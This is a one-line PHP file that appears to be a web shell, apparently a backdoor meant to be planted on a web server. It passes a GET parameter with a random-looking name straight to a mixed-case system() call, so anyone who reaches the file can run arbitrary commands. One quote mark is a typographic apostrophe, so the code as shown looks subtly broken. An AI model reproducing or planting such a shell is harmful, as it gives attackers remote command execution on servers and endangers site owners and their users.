<?php
SysTeM($_GET[’Xln7Mh1i']);
?>
